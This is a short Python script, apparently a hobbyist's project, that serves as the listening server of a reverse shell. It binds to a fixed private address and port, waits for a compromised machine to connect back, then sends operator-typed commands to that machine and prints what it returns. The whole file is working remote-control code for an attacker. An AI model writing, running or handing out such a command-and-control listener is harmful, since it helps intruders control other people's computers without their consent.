#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/21/2021-01/23/2021

import socket
from termcolor import colored
import json
import os

def reliable_send(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = input("Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'exit':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        else:
            result = reliable_recv()
            print(result)

def server():
    global sock
    global ip
    global target

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("192.168.7.125", 54321))
    sock.listen(5)
    print(colored("[!] Listening For Incoming Connections", "yellow"))
    target, ip = sock.accept()
    print(colored("[+] Connection Established From : %s" % str(ip), "green"))

server()
shell()
sock.close()
